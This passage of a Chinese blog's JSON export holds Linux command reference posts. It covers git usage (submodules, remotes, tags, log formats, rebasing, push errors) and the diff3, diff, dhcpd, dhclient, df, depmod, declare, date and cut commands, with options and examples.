localbranch:remotebranch # 推送本地指定分支，到远端上指定分支 git push origin :remotebranch # 删除远端指定分支 git checkout -b [--track] test origin/dev # 基于远端dev分支，新建本地test分支[同时设置跟踪] submodule 克隆项目同时克隆 submodule git clone https://github.com/xxxxxxxx/handbook.git --depth=1 --recurse-submodules 克隆项目，之后再手动克隆 submodule 子项目 git submodule add --force '仓库地址' '路径' # 其中，仓库地址是指子模块仓库地址，路径指将子模块放置在当前工程下的路径。 # 注意：路径不能以 / 结尾（会造成修改不生效）、不能是现有工程已有的目录（不能順利 Clone） git submodule init # 初始化submodule git submodule update # 更新submodule(必须在根目录执行命令) git submodule update --init --recursive # 下载的工程带有submodule 当使用git clone下来的工程中带有 submodule 时，初始的时候，submodule 的内容并不会自动下载下来的，此时，只需执行如下命令： git submodule foreach git pull # submodule 里有其他的 submodule 一次更新 git submodule foreach git pull origin master # submodule更新 git submodule foreach --recursive git submodule init git submodule foreach --recursive git submodule update 删除文件 git rm -rf node_modules/ remote git 是一个分布式代码管理工具，所以可以支持多个仓库，在 git 里，服务器上的仓库在本地称之为 remote。个人开发时，多源用的可能不多，但多源其实非常有用。 git remote add origin1 git@github.com:xxxxx/data.js.git git remote # 显示全部源 git remote -v # 显示全部源+详细信息 git remote rename origin1 origin2 # 重命名 git remote rm origin # 删除 git remote show origin # 查看指定源的全部信息 标签 tag 当开发到一定阶段时，给程序打标签是非常棒的功能。 git tag -a v0.1 -m 'my version 1.4' # 新建带注释标签 git push origin --tags # 一次性推送所有分支 git push origin v1.5 # 推送单个tag到orgin源上 git tag -v v1.4.2.1 # 验证标签，验证已经签署的标签 git show v1.5 # 看到对应的 GPG 签 git tag # 列出现有标签 git tag v0gi.1 # 新建标签 git checkout tagname # 切换到标签 git tag -d v0.1 # 删除标签 git push origin :refs/tags/v0.1 # 删除远程标签 git pull --all # 获取远程所有内容包括tag git --git-dir='&lt;绝对地址&gt;/.git' describe --tags HEAD # 查看本地版本信息 日志 log git config format.pretty oneline #显示历史记录时，每个提交的信息只显示一行 git config color.ui true #彩色的 git 输出 git log #查看最近的提交日志 git log --pretty=oneline #单行显示提交日志 git log --graph --pretty=oneline --abbrev-commit git log -num #显示第几条log（倒数） git reflog #查看所有分支的所有操作记录 git log --since=1.day #一天内的提交；你可以给出各种时间格式，比如说具体的某一天（“2008-01-15”），或者是多久以前（“2 years 1 day 3 minutes ago”）。 git log --pretty=&quot;%h - %s&quot; --author=自己的名字 #查看自己的日志 git log -p -2 #展开两次更新显示每次提交的内容差异 git log --stat #要快速浏览其他协作者提交的更新都作了哪些改动 git log --pretty=format:&quot;%h - %an, %ar : %s&quot;#定制要显示的记录格式 git log --pretty=format:'%h : %s' --date-order --graph # 拓扑顺序展示 git log --pretty=format:'%h : %s - %ad' --date=short #日期YYYY-MM-DD显示 git log &lt;last tag&gt; HEAD --pretty=format:%s # 只显示commit git config --global format.pretty '%h : %s - %ad' --date=short #日期YYYY-MM-DD显示 写入全局配置 选项 说明 选项 说明 %H 提交对象（commit）的完整哈希字串 %ad 作者修订日期（可以用 -date= 选项定制格式） %h 提交对象的简短哈希字串 %ar 作者修订日期，按多久以前的方式显示 %T 树对象（tree）的完整哈希字串 %cn 提交者(committer)的名字 %t 树对象的简短哈希字串 %ce 提交者的电子邮件地址 %P 父对象（parent）的完整哈希字串 %cd 提交日期 %p 父对象的简短哈希字串 %cr 提交日期，按多久以前的方式显示 %an 作者（author）的名字 %s 提交说明 %ae 作者的电子邮件地址 - - 重写历史 git commit --amend # 改变最近一次提交 git rebase -i HEAD~3 # 修改最近三次的提交说明，或者其中任意一次 git commit --amend # 保存好了，这些指示很明确地告诉了你该干什么 git rebase --continue # 修改提交说明，退出编辑器。 pick f7f3f6d changed my name a bit pick 310154e updated README formatting and added blame pick a5f4a0d added cat-file 改成 pick 310154e updated README formatting and added blame pick f7f3f6d changed my name a bit 删除仓库 cd .. rm -rf repo.git Github官方教程 其它 git help * # 获取命令的帮助信息 git status # 获取当前的状态，非常有用，因为git会提示接下来的能做的操作 报错问题解决 git fatal: protocol error: bad line length character: No s 解决办法：更换 remote 地址为http/https的 The requested URL returned error: 403 Forbidden while accessing 解决 github push 错误的办法： #vim 编辑器打开 当前项目中的config文件 vim .git/config #修改 [remote &quot;origin&quot;] url = https://github.com/xxxxxxxx/example.git #为下面代码 [remote &quot;origin&quot;] url = https://xxxxxxxx@github.com/xxxxxxxx/example.git git status 显示中文问题 在查看状态的时候 git status 如果是中文就显示下面的情况 \\344\\272\\247\\345\\223\\201\\351\\234\\200\\346\\261\\202 解决这个问题方法是： git config --global core.quotepath false ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"git","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/git/","stats":{"text":"31 min read","time":1840000,"words":7019,"minutes":31},"date":"2022-02-01 08:16:44","dateFormat":"2022-02-01"},{"content":"比较 3 个文件不同的地方。 补充说明 diff3 命令用于比较 3 个文件，将 3 个文件的不同的地方显示到标准输出。 语法 diff3 (选项) (参数) 选项 -a：把所有的文件都当做文本文件按照行为单位进行比较，即给定的文件不是文本文件； -A：合并第2个文件和第3个文件之间的不同到第1个文件中，有冲突内容用括号括起来； -B：与选项“-A”功能相同，但是不显示冲突的内容； -e/--ed：生成一个“-ed”脚本，用于将第2个文件和第3个文件之间的不同合并到第1个文件中； --easy-only：除了不显示互相重叠的变化，与选项“-e”的功能相同； -i：为了和system V系统兼容，在“ed”脚本的最后生成“w”和“q”命令。此选项必须和选项“-AeExX3”连用，但是不能和“-m”连用； --initial-tab：在正常格式的行的文本前，输出一个TAB字符而非两个空白字符。此选项将导致在行中TAB字符的对齐方式看上去规范。 参数 文件1：指定要比较的第 1 个文件； 文件2：指定要比较的第 2 个文件； 文件3：指定要比较的第 3 个文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"diff3","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/diff3/","stats":{"text":"2 min read","time":73000,"words":338,"minutes":2},"date":"2022-02-01 08:09:52","dateFormat":"2022-02-01"},{"content":"比较给定的两个文件的不同。 补充说明 diff 命令在最简单的情况下，比较给定的两个文件的不同。如果使用 “-” 代替 “文件” 参数，则要比较的内容将来自标准输入。diff 命令是以逐行的方式，比较文本文件的异同处。如果该命令指定进行目录的比较，则将会比较该目录中具有相同文件名的文件，而不会对其子目录文件进行任何比较操作。 语法 diff (选项) (参数) 选项 -&lt;行数&gt;：指定要显示多少行的文本。此参数必须与-c或-u参数一并使用； -a或——text：diff预设只会逐行比较文本文件； -b或--ignore-space-change：不检查空格字符的不同； -B或--ignore-blank-lines：不检查空白行； -c：显示全部内容，并标出不同之处； -C&lt;行数&gt;或--context&lt;行数&gt;：与执行“-c-&lt;行数&gt;”指令相同； -d或——minimal：使用不同的演算法，以小的单位来做比较； -D&lt;巨集名称&gt;或ifdef&lt;巨集名称&gt;：此参数的输出格式可用于前置处理器巨集； -e或——ed：此参数的输出格式可用于ed的script文件； -f或-forward-ed：输出的格式类似ed的script文件，但按照原来文件的顺序来显示不同处； -H或--speed-large-files：比较大文件时，可加快速度； -l&lt;字符或字符串&gt;或--ignore-matching-lines&lt;字符或字符串&gt;：若两个文件在某几行有所不同，而之际航同时都包含了选项中指定的字符或字符串，则不显示这两个文件的差异； -i或--ignore-case：不检查大小写的不同； -l或——paginate：将结果交由pr程序来分页； -n或——rcs：将比较结果以RCS的格式来显示； -N或--new-file：在比较目录时，若文件A仅出现在某个目录中，预设会显示：Only in目录，文件A 若使用-N参数，则diff会将文件A 与一个空白的文件比较； -p：若比较的文件为C语言的程序码文件时，显示差异所在的函数名称； -P或--unidirectional-new-file：与-N类似，但只有当第二个目录包含了第一个目录所没有的文件时，才会将这个文件与空白的文件做比较； -q或--brief：仅显示有无差异，不显示详细的信息； -r或——recursive：比较子目录中的文件； -s或--report-identical-files：若没有发现任何差异，仍然显示信息； -S&lt;文件&gt;或--starting-file&lt;文件&gt;：在比较目录时，从指定的文件开始比较； -t或--expand-tabs：在输出时，将tab字符展开； -T或--initial-tab：在每行前面加上tab字符以便对齐； -u，-U&lt;列数&gt;或--unified=&lt;列数&gt;：以合并的方式来显示文件内容的不同； -v或——version：显示版本信息； -w或--ignore-all-space：忽略全部的空格字符； -W&lt;宽度&gt;或--width&lt;宽度&gt;：在使用-y参数时，指定栏宽； -x&lt;文件名或目录&gt;或--exclude&lt;文件名或目录&gt;：不比较选项中所指定的文件或目录； -X&lt;文件&gt;或--exclude-from&lt;文件&gt;；您可以将文件或目录类型存成文本文件，然后在=&lt;文件&gt;中指定此文本文件； -y或--side-by-side：以并列的方式显示文件的异同之处； --help：显示帮助； --left-column：在使用-y参数时，若两个文件某一行内容相同，则仅在左侧的栏位显示该行内容； --suppress-common-lines：在使用-y参数时，仅显示不同之处。 参数 文件1：指定要比较的第一个文件； 文件2：指定要比较的第二个文件。 ##实例 将目录/usr/li下的文件 &quot;test.txt&quot; 与当前目录下的文件 &quot;test.txt&quot; 进行比较，输入如下命令： diff /usr/li test.txt #使用diff指令对文件进行比较 上面的命令执行后，会将比较后的不同之处以指定的形式列出，如下所示： n1 a n3,n4 n1,n2 d n3 n1,n2 c n3,n4 其中，字母&quot;a&quot;、&quot;d&quot;、&quot;c&quot;分别表示添加、删除及修改操作。而&quot;n1&quot;、&quot;n2&quot;表示在文件1中的行号，&quot;n3&quot;、&quot;n4&quot;表示在文件2中的行号。 注意：以上说明指定了两个文件中不同处的行号及其相应的操作。在输出形式中，每一行后面将跟随受到影响的若干行。其中，以 &lt; 开始的行属于文件 1，以 &gt; 开始的行属于文件 2。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"diff","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/diff/","stats":{"text":"5 min read","time":279000,"words":1214,"minutes":5},"date":"2022-02-01 08:07:47","dateFormat":"2022-02-01"},{"content":"运行 DHCP 服务器。 语法 dhcpd [选项] [网络接口] 选项 -p &lt;端口&gt; 指定dhcpd监听的端口 -f 作为前台进程运行dhcpd -d 启用调试模式 -q 在启动时不显示版权信息 -t 简单地测试配置文件的语法是否正确的，但不会尝试执行任何网络操作 -T 可以用来测试租约数据库文件 -4 运行DHCP服务器 -6 运行DHCPv6服务器 -s &lt;服务器&gt; 指定发送回复的服务器 -cf &lt;配置文件&gt; 指定配置文件 -lf &lt;租约文件&gt; 指定租约文件 -pf &lt;PID文件&gt; 指定PID文件 -tf &lt;跟踪输出文件&gt; 指定文件记录DHCP服务器的整个启动状态 例子 对 DHCP 服务器进行排错。 [root@localhost ~]# dhcpd InternetSystems Consortium DHCP Server 4.1.1-P1 Copyright2004-2010 Internet Systems Consortium. All rightsreserved. For info,please visit https://www.isc.org/software/dhcp/ Not searchingLDAP since ldap-server, ldap-port and ldap-base-dn were not specified in theconfig file Wrote 0deleted host decls to leases file. Wrote 0 newdynamic host decls to leases file. Wrote 1leases to leases file. Listening onLPF/eth0/00:0c:29:fc:2f:e5/192.168.0.0/24 Sendingon LPF/eth0/00:0c:29:fc:2f:e5/192.168.0.0/24 Sendingon Socket/fallback/fallback-net [root@rhel~]# There's already a DHCP server running. This versionof ISC DHCP is based on the release available onftp.isc.org. Features have been addedand other changes have beenmade to the base software release in order to make it workbetter with this distribution. exiting. ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"dhcpd","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/dhcpd/","stats":{"text":"2 min read","time":101000,"words":351,"minutes":2},"date":"2022-02-01 08:04:09","dateFormat":"2022-02-01"},{"content":"动态获取或释放 IP 地址。 补充说明 dhclient 命令使用动态主机配置协议动态的配置网络接口的网络参数。 语法 dhclient (选项) (参数) 选项 0：指定dhcp客户端监听的端口号； -d：总是以前台方式运行程序； -q：安静模式，不打印任何错误的提示信息； -r：释放ip地址。 参数 网络接口：操作的网络接口。 实例 dhclient -r #释放IP dhclient #获取IP `` ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"dhclient","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/dhclient/","stats":{"text":"1 min read","time":26000,"words":122,"minutes":1},"date":"2022-02-01 08:03:07","dateFormat":"2022-02-01"},{"content":"显示磁盘的相关信息。 补充说明 df 命令用于显示磁盘分区上的可使用的磁盘空间。默认显示单位为 KB。可以利用该命令来获取硬盘被占用了多少空间，目前还剩下多少空间等信息。 语法 df (选项) (参数) 选项 -a或--all：包含全部的文件系统； --block-size=&lt;区块大小&gt;：以指定的区块大小来显示区块数目； -h或--human-readable：以可读性较高的方式来显示信息； -H或--si：与-h参数相同，但在计算时是以1000 Bytes为换算单位而非1024 Bytes； -i或--inodes：显示inode的信息； -k或--kilobytes：指定区块大小为1024字节； -l或--local：仅显示本地端的文件系统； -m或--megabytes：指定区块大小为1048576字节； --no-sync：在取得磁盘使用信息前，不要执行sync指令，此为预设值； -P或--portability：使用POSIX的输出格式； --sync：在取得磁盘使用信息前，先执行sync指令； -t&lt;文件系统类型&gt;或--type=&lt;文件系统类型&gt;：仅显示指定文件系统类型的磁盘信息； -T或--print-type：显示文件系统的类型； -x&lt;文件系统类型&gt;或--exclude-type=&lt;文件系统类型&gt;：不要显示指定文件系统类型的磁盘信息； --help：显示帮助； --version：显示版本信息。 参数 文件：指定文件系统上的文件。 大小格式 显示值以--block-size和DF_BLOCK_SIZE，BLOCK_SIZE和BLOCKSIZE环境变量中的第一个可用SIZE为单位。 否则，单位默认为1024个字节（如果设置POSIXLY_CORRECT，则为512）。 SIZE 是一个整数和可选单位（例如：10M 是 10 * 1024 * 1024）。 单位是 K，M，G，T，P，E，Z，Y（1024 的幂）或 KB，MB，...（1000 的幂）。 实例 查看系统磁盘设备，默认是KB为单位： [root@LinServ-1 ~]# df 文件系统 1K-块 已用 可用 已用% 挂载点 /dev/sda2 146294492 28244432 110498708 21% / /dev/sda1 1019208 62360 904240 7% /boot tmpfs 1032204 0 1032204 0% /dev/shm /dev/sdb1 2884284108 218826068 2518944764 8% /data1 使用-h选项以 KB 以上的单位来显示，可读性高： [root@LinServ-1 ~]# df -h 文件系统 容量 已用 可用 已用% 挂载点 /dev/sda2 140G 27G 106G 21% / /dev/sda1 996M 61M 884M 7% /boot tmpfs 1009M 0 1009M 0% /dev/shm /dev/sdb1 2.7T 209G 2.4T 8% /data1 查看全部文件系统： [root@LinServ-1 ~]# df -a 文件系统 1K-块 已用 可用 已用% 挂载点 /dev/sda2 146294492 28244432 110498708 21% / proc 0 0 0 - /proc sysfs 0 0 0 - /sys devpts 0 0 0 - /dev/pts /dev/sda1 1019208 62360 904240 7% /boot tmpfs 1032204 0 1032204 0% /dev/shm /dev/sdb1 2884284108 218826068 2518944764 8% /data1 none 0 0 0 - /proc/sys/fs/binfmt_misc 显示public目录中的可用空间量，如以下输出中所示： df public # Filesystem 1K-blocks Used Available Use% Mounted on # /dev/loop0 18761008 15246924 2554392 86% /d Avail ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"df","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/df/","stats":{"text":"4 min read","time":180000,"words":706,"minutes":4},"date":"2022-02-01 07:34:30","dateFormat":"2022-02-01"},{"content":"分析可载入模块的相依性。 补充说明 depmod 命令可产生模块依赖的映射文件，在构建嵌入式系统时，需要由这个命令来生成相应的文件，由 modprobe 使用。 语法 depmod (选项) 选项 -a或--all：分析所有可用的模块； -d或debug：执行排错模式； -e：输出无法参照的符号； -i：不检查符号表的版本； -m&lt;文件&gt;或system-map&lt;文件&gt;：使用指定的符号表文件； -s或--system-log：在系统记录中记录错误； -v或--verbose：执行时显示详细的信息； -V或--version：显示版本信息； --help：显示帮助。 实例 depmod -b /home/windsome/EMMA3PF-KernelSource-20080626/install_pos -e -F ./boot/System.map -v 2.6.18_pro500-bcm91250-mips2_fp_be -A -a /home/windsome/EMMA3PF-KernelSource-20080626/install_pos是我make mod_install后，所有模块的存放路径。 ./boot/System.map是make linux后生成，我拷贝到此目录的。 2.6.18_pro500-bcm91250-mips2_fp_be是我 build 的 linux 的版本。 编译 linux 过程及执行 depmod 的例子： genkernel.sh (at linux-2.6.18_pro500) ####### export INSTALL_ROOT_EMMA3PF=&quot;/home/windsome/EMMA3PF-KernelSource-20080626/install_pos&quot; export INSTALL_MOD_EMMA3PF=&quot;/home/windsome/EMMA3PF-KernelSource-20080626/install_pos&quot; rm /home/windsome/EMMA3PF-KernelSource-20080626/install_pos/lib -rf rm /home/windsome/EMMA3PF-KernelSource-20080626/install_pos/boot/* -rf cd &lt;linux_src_dir&gt; make make modules_install cp vmlinux System.map /home/windsome/EMMA3PF-KernelSource-20080626/install_pos/boot/ -p cd /home/windsome/EMMA3PF-KernelSource-20080626/install_pos depmod -b /home/windsome/EMMA3PF-KernelSource-20080626/install_pos -e -F ./boot/System.map -v 2.6.18_pro500-bcm91250-mips2_fp_be -A -a 其他用法： 在 linux 桌面系统中，当你编译了新的驱动，为了能够用modprobe ***加载模块, 你需要先将模块拷贝到/lib/modules /2.6.31-20-generic目录下，然后运行sudo depmod -a将模块信息写入 modules.dep、modules.dep.bin、modules.alias.bin、modules.alias 和 modules.pcimap 文件中。 如，我编译了一个新的 wifi 驱动 r8192se_pci.ko，将其拷贝到/lib/modules/2.6.31-20-generic/wireless下，然后到/lib/modules/2.6.31-20-generic运行depmod -a，之后可以在任意目录运行 modprobe r8192se_pci。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"depmod","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/depmod/","stats":{"text":"3 min read","time":130000,"words":477,"minutes":3},"date":"2022-02-01 07:28:07","dateFormat":"2022-02-01"},{"content":"声明变量，设置或显示变量的值和属性。 语法 declare [-aAfFgilnrtux] [-p] [name[=value] ...] 主要用途 显示包含指定属性的全部变量和值 显示包含指定属性的一到多个变量和值 显示一到多个变量的属性和值 显示所有变量的属性和值并显示函数的定义 显示所有变量的属性和值 显示所有全局变量的属性和值 显示全部函数名和函数定义 只显示全部函数名 显示一到多个函数名和函数定义 只显示一到多个函数名 声明全局变量（可选：赋值） 声明变量（可选：赋值、属性） 增加、删除变量的属性（可选：赋值） 选项 -f 将操作或显示限制为函数名及函数定义。 -F 只显示函数名（调试时附加行号和源文件）。 -g 在shell函数中使用时创建全局变量；其他情况下忽略。 -p 显示每个名称的属性和值。 *设置属性的选项: -a 创建数组（如果支持）。 -A 创建关联数组（如果支持）。 -i 增加整型属性。 +i 删除整型属性。 -l 增加小写属性，变量的值将转换为小写。 +l 删除小写属性。 -n 增加引用属性（如果该选项存在）。 +n 删除引用属性（如果该选项存在）。 -r 增加只读属性。 -t 增加追踪属性。 +t 删除追踪属性。 -u 增加大写属性，变量的值将转换为大写。 +u 删除大写属性。 -x 增加导出属性。 +x 删除导出属性。 参数 name（可选）：变量名或函数名。 value（可选）：变量的值。 返回值 declare 返回 true 除非你提供了非法选项或赋值错误。 例子 # 声明变量，当然也欢迎您在这个网站（感谢本项目发起人 @jaywcjlove）查询linux命令。 declare reference_website='https://wangchujiang.com/linux-command/' # 显示所有包含整型属性的变量和值。 declare -i # 定义变量b并赋值为3，具有整型属性。 declare -i b=5 # 显示属性，返回 declare -i b=&quot;5&quot;。 declare -p b # 删除整型属性。 declare +i b # 显示属性，返回 declare -- b=&quot;5&quot;。 declare -p b # 根据变量属性强制转换值的英文大小写。 declare -u uc_var='abc' declare -l lc_var='ABC' # 显示'ABC abc'; echo &quot;${uc_var} ${lc_var}&quot; # 定义函数内的全局变量 function test(){ declare -g a=3 # 或者 local -g b=3 # 或者 c=3 # 让我们查看它们的属性。 declare -p a b c } # 执行函数。 test # 返回结果。 # declare -- a=&quot;3&quot; # declare -- b=&quot;3&quot; # declare -- c=&quot;3&quot; # 定义函数外的全局变量 declare a=3 b=3 declare –p a b # 返回结果如下。 # declare -- a=&quot;3&quot; # declare -- b=&quot;3&quot; # 定义局部变量 function test2(){ local -i a=3 declare -i b=3 } test2 # 没有该变量（已经被销毁了） echo &quot;${a} ${b}&quot; # 因此，我们日常脚本中最常见的类似于'a=3'实际上是声明并赋值了一个全局变量。 # 在接下来的 **讨论** 环节会延伸讨论全局和局部变量问题。 # 注意，不能使用 `+a` 或 `+A` 取消数组，也不能使用 `+r` 取消只读属性。 # 定义只读数组，设置属性的同时定义赋值。 declare -ar season=('Spring' 'Summer' 'Autumn' 'Winter') # 或者这样。 season=('Spring' 'Summer' 'Autumn' 'Winter') declare -ar season # 显示所有数组。 declare -a # 定义关联数组。 declare -A fruits=(['apple']='red' ['banana']='yellow') # 显示所有关联数组。 declare -A # 显示所有变量的属性和值并显示函数的定义，输出很长。 declare # 显示所有变量的属性和值。 declare -p # 显示所有全局变量的属性和值。 declare -g # 显示全部函数名和函数定义。 declare -f # 只显示全部函数名。 declare -F # 定义两个函数。 function func_a(){ echo $(date +&quot;%F %T&quot;); } function func_b(){ cd /; ls -lh --sort=time; } # 显示一到多个函数名和函数定义。 declare -f func_a func_b # 只显示一到多个函数名，验证某个名称是否已经定义为函数时有用。 declare -F func_a func_b # 最好不要让函数名和变量名相同。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"declare","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/declare/","stats":{"text":"5 min read","time":246000,"words":1046,"minutes":5},"date":"2022-02-01 07:25:30","dateFormat":"2022-02-01"},{"content":"显示或设置系统时间与日期。 概要 date [OPTION]... [+FORMAT] date [-u|--utc|--universal] [MMDDhhmm[[CC]YY][.ss]] 主要用途 转换时间到选定的格式，默认为当前。 设置系统时间。 参数 format：输出的时间格式。 format可用的转义序列如下： %% 百分号 %a 当地缩写的工作日名称（例如，Sun） %A 当地完整的工作日名称（例如，Sunday） %b 当地缩写的月份名称（例如，Jan） %B 当地完整的月份名称（例如，January） %c 当地的日期和时间（例如，Thu Mar 3 23:05:25 2005） %C 世纪，和%Y类似，但是省略后两位（例如，20） %d 一月中的一天（例如，01） %D 日期，等价于%m/%d/%y %e 一月中的一天，格式使用空格填充，等价于%_d %F 完整的日期；等价于%+4Y-%m-%d %g ISO标准计数周的年份的最后两位数字 %G ISO标准计数周的年份，通常只对%V有用 %h 等价于%b %H 小时，范围（00..23） %I 小时，范围（00..23） %j 一年中的一天，范围（001..366） %k 小时，使用空格填充，范围（0..23），等价于%_H %l 小时，使用空格填充，范围（1..12），等价于%_I %m 月，范围（01..12） %M 分钟，范围（00..59） %n 换行符 %N 纳秒，范围（000000000..000000000） %p 用于表示当地的AM或PM，如果未知则为空白 %P 类似于%p，但用小写表示 %q 季度，范围（1..4） %r 当地以12小时表示的时钟时间（例如，11:11:04 PM） %R 24小时每分钟；等价于%H:%M %s 自协调世界时1970年01月01日00时00分以来的秒数 %S 秒数，范围（00..60） %t 水平制表符 %T 时间；等价于%H:%M:%S %u 一周中的一天（1..7），1代表星期一 %U 一年中的第几周，周日作为一周的起始（00..53） %V ISO标准计数周，该方法将周一作为一周的起始（01..53） %w 一周中的一天（0..6），0代表星期天 %W 一年中的第几周，周一作为一周的起始（00..53） %x 当地的日期表示（例如，12/31/99） %X 当地的时间表示（例如，23:13:48） %y 年份后两位数字，范围（00..99） %Y 年份 %z +hhmm格式的数值化时区格式（例如，-0400） %:z +hh:mm格式的数值化时区格式（例如，-04:00） %::z +hh:mm:ss格式的数值化时区格式（例如，-04:00:00） %:::z 数值化时区格式，相比上一个格式增加':'以显示必要的精度（例如，-04，+05:30） %Z 时区缩写（如EDT） 默认情况下，日期用零填充数字字段；以下可选的符号可以跟在'%'后面: - (连字符) 不要填充相应的字段。 _ (下划线) 使用空格填充相应的字段。 0 (数字0) 使用数字0填充相应的字段。 + 用数字0填充，未来年份大于4位数字则在前面加上'+'号。 ^ 允许的情况下使用大写。 # 允许的情况下将默认的大写转换为小写，默认的小写转换为大写。 在任何标志之后都有一个可选的字段宽度，如小数；然后是一个可选的修饰符，在可用的情况下，使用E来使用当地语言环境的替代表示， 使用O来使用当地语言环境的替代数字符号。 选项 长选项与短选项等价 -d, --date=STRING 解析字符串并按照指定格式输出，字符串不能是'now'。 --debug 注释已解析的日期，并将有疑问的用法发送到标准错误。 -f, --file=DATEFILE 类似于--date; 一次从DATEFILE处理一行。 -I[FMT], --iso-8601[=FMT] 按照ISO 8601格式输出，FMT可以为'date'(默认)，'hours'，'minutes'，'seconds'，'ns'。 例如：2006-08-14T02:34:56-06:00 -R, --rfc-email 按照RFC 5322格式输出，例如: Mon, 14 Aug 2006 02:34:56 -0600 --rfc-3339=FMT 按照RFC 3339格式输出，FMT可以为'date', 'seconds','ns'中的一个， 例如：2006-08-14 02:34:56-06:00 -r, --reference=FILE 显示文件的上次修改时间。 -s, --set=STRING 根据字符串设置系统时间。 -u, --utc, --universal 显示或设置世界协调时(UTC)。 --help 显示帮助信息并退出。 --version 显示版本信息并退出。 返回值 返回状态为成功除非给出了非法选项或非法参数。 例子 # 格式化输出： date +&quot;%Y-%m-%d&quot; 2009-12-07 # 输出昨天日期： date -d &quot;1 day ago&quot; +&quot;%Y-%m-%d&quot; 2012-11-19 # 2秒后输出： date -d &quot;2 second&quot; +&quot;%Y-%m-%d %H:%M.%S&quot; 2012-11-20 14:21.31 # 传说中的 1234567890 秒： date -d &quot;1970-01-01 1234567890 seconds&quot; +&quot;%Y-%m-%d %H:%M:%S&quot; # 或者 date -d@1234567890 +&quot;%F %T&quot; # 输出结果 2009-02-13 23:02:30 # 时间格式转换： date -d &quot;2009-12-12&quot; +&quot;%Y/%m/%d %H:%M.%S&quot; # 输出结果 2009/12/12 00:00.00 # apache格式转换： date -d &quot;Dec 5, 2009 12:00:37 AM&quot; +&quot;%Y-%m-%d %H:%M.%S&quot; # 输出结果 2009-12-05 00:00.37 # 格式转换后时间游走： date -d &quot;Dec 5, 2009 12:00:37 AM 2 year ago&quot; +&quot;%Y-%m-%d %H:%M.%S&quot; # 输出结果 2007-12-05 00:00.37 # 时间加减操作： date +%Y%m%d # 显示年月日 date -d &quot;+1 day&quot; +%Y%m%d # 显示前一天的日期 date -d &quot;-1 day&quot; +%Y%m%d # 显示后一天的日期 date -d &quot;-1 month&quot; +%Y%m%d # 显示上一月的日期 date -d &quot;+1 month&quot; +%Y%m%d # 显示下一月的日期 date -d &quot;-1 year&quot; +%Y%m%d # 显示前一年的日期 date -d &quot;+1 year&quot; +%Y%m%d # 显示下一年的日期 # 设定时间： date -s # 设置当前时间，只有root权限才能设置，其他只能查看 date -s 20120523 # 设置成20120523，这样会把具体时间设置成00:00:00 date -s 01:01:01 # 设置具体时间，不会对日期做更改 date -s &quot;01:01:01 2012-05-23&quot; # 这样可以设置全部时间 date -s &quot;01:01:01 20120523&quot; # 这样可以设置全部时间 date -s &quot;2012-05-23 01:01:01&quot; # 这样可以设置全部时间 date -s &quot;20120523 01:01:01&quot; # 这样可以设置全部时间 # 有时需要检查一组命令花费的时间： start=$(date +%s) nmap wangchujiang.com &amp;&gt; /dev/null end=$(date +%s) difference=$(( end - start )) # 显示执行时间 echo $difference seconds. # 当你考虑输出带有时间的字符串时，例如（Current time: 2019/05/19）： # 通常使用的方法： echo &quot;Current time: $(date +&quot;%Y/%m/%d&quot;)&quot; # 另一种方法： suffix='Current time:' # 注意如果换成单引号就不能替换变量了。 date +&quot;${suffix} %Y/%m/%d&quot; 注意 该命令是 GNU coreutils 包中的命令，相关的帮助信息请查看man -s 1 date或info coreutils 'date invocation'。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"date","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/date/","stats":{"text":"8 min read","time":441000,"words":1726,"minutes":8},"date":"2022-02-01 07:16:26","dateFormat":"2022-02-01"},{"content":"连接文件并打印到标准输出设备上。 补充说明 cut 命令用来显示行中的指定部分，删除文件中指定字段。cut 经常用来显示文件的内容，类似于 type 命令。 说明：该命令有两项功能，其一是用来显示文件的内容，它依次读取由参数 file 所指 明的文件，将它们的内容输出到标准输出上；其二是连接两个或多个文件，如 cut fl f2 &gt; f3 将把文件 fl 和 f2 的内容合并起来，然后通过输出重定向符“&gt;”的作用，将它们放入文件 f3 中。 当文件较大时，文本在屏幕上迅速闪过（滚屏），用户往往看不清所显示的内容。因此，一般用 more 等命令分屏显示。为了控制滚屏，可以按 Ctrl + S 键，停止滚屏；按 Ctrl + Q 键可以恢复滚屏。按 Ctrl + C（中断）键可以终止该命令的执行，并且返回 Shell 提示符状态。 语法 cut（选项）（参数） 选项 -b：仅显示行中指定直接范围的内容； -c：仅显示行中指定范围的字符； -d：指定字段的分隔符，默认的字段分隔符为“TAB”； -f：显示指定字段的内容； -n：与“-b”选项连用，不分割多字节字符； --complement：补足被选择的字节、字符或字段； --out-delimiter= 字段分隔符：指定输出内容是的字段分割符； --help：显示指令的帮助信息； --version：显示指令的版本信息。 参数 文件：指定要进行内容过滤的文件。 实例 例如有一个学生报表信息，包含 No、Name、Mark、Percent： [root@localhost text]# cat test.txt No Name Mark Percent 01 tom 69 91 02 jack 71 87 03 alex 